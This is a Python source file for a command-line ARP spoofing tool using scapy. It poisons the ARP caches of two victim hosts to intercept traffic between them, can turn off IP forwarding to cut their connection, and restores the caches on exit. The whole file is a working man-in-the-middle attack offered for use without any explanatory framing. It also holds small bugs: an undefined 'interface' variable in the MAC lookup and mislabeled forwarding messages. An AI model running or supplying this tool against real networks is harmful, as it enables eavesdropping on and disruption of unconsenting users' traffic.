#!/usr/bin/python3
# Import the modules
from scapy.all import *
import sys
import os
import time
import argparse


parser = argparse.ArgumentParser(description='Perform ARP spoofing attack against two targets.')
parser._action_groups.pop()
required = parser.add_argument_group('required arguments')
optional = parser.add_argument_group('optional arguments')
required.add_argument('-i', type=str, metavar='<interface>', nargs=1, help='Interface', required=True)
required.add_argument('-t', type=str, nargs=2, metavar='<IP>', help='Victims (2 IP addresses)', required=True)
optional.add_argument('-d', action='store_true', help='Disable IP forwarding', required=False, default=False)
optional.add_argument('--no-color', action='store_true', help='Disable colored output', required=False, default=False)

args = parser.parse_args()

if not args.no_color:
    from colorama import init
    init()
    from colorama import Fore, Back, Style
    def print_error(s):
        print(Fore.RED + "[-]", end=' ')
        print(Style.RESET_ALL, end='')
        print(s)
        
    def print_success(s):
        print(Fore.GREEN + "[+]", end=' ')
        print(Style.RESET_ALL, end='')
        print(s)
    
    def print_info(s):
        print(Fore.BLUE + "[*]", end=' ')
        print(Style.RESET_ALL, end='')
        print(s)

else:
    def print_error(s):
        print("[-]", s)
    def print_success(s):
        print("[+]", s)
    def print_info(s):
        print("[*]", s)

def get_mac_address(IP):
    conf.verb = 0
    answered, unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for send, rcv in answered:
        return rcv.sprintf(r"%Ether.src%")

def cleanUp(target1, target2):
    mac1 = get_mac_address(target1)
    mac2 = get_mac_address(target2)
    send(ARP(op = 2, pdst = target2, psrc = target1, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = mac1), count = 7)
    send(ARP(op = 2, pdst = target1, psrc = target2, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = mac2), count = 7)


def spoof(interface, target1, target2):
    mac1 = None
    mac2 = None
    try:
        mac1 = get_mac_address(target1)
        mac2 = get_mac_address(target2)
    except:
        if not mac1:
            print_error("Unable to fetch MAC for " + target1)
        else:
            print_error("Unable to fetch MAC for " + target2)
        return
    print_success("Start ARP spoofing")
    while True:
        try:
            send(ARP(op = 2, pdst = target1, psrc = target2, hwdst = mac1))
            send(ARP(op = 2, pdst = target2, psrc = target1, hwdst = mac2))
            time.sleep(1)
        except KeyboardInterrupt:
            print_info("Cleaning")
            cleanUp(target1, target2)
            print_success("Done")
            break



# Main functionality

toggle_forwarding = False
if args.d:
    print_info("Attempting to disable port forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    toggle_forwarding = True

spoof(args.i, args.t[0], args.t[1])

if toggle_forwarding:
    print_info("Attempting to disable port forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")